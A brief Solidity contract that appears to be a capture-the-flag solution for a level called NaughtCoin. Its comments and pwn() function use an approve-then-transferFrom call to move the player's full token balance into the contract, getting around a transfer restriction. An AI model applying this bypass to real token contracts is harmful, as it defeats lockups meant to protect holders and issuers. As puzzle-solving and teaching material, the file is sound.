// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

//player approve NaughtyBois to spend maxuint256 of NaughtCoin 0x88899D00ed51f9803C95fd1Bec9DB57892a95E2c
//create function on contract that calls transferFrom(player to address(this))

contract NaughtyBois {
    IERC20 NaughtCoin = IERC20(0x88899D00ed51f9803C95fd1Bec9DB57892a95E2c);

    function pwn() external {
        uint256 balBefore = NaughtCoin.balanceOf(msg.sender);
        NaughtCoin.transferFrom(msg.sender, address(this), balBefore);
        uint256 thisBal = NaughtCoin.balanceOf(address(this));
    }
}
